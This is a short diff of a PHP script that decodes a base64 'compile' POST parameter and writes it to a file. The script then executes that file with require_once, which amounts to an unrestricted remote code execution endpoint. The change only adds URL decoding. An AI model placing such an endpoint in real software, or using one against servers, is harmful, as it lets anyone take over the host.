@@ -4,7 +4,7 @@ if(!isset($_POST['disable_ob']))
   ob_start('error_handler');
 if(isset($_POST['compile']))
 {
-  $php_data = base64_decode($_POST['compile']);
+  $php_data = urldecode(base64_decode($_POST['compile']));
   $php_data = preg_replace('#^<\?php#i', "", trim($php_data));
   file_put_contents("php_inc.txt", "<?php\n".$php_data);
   require_once ("php_inc.txt");
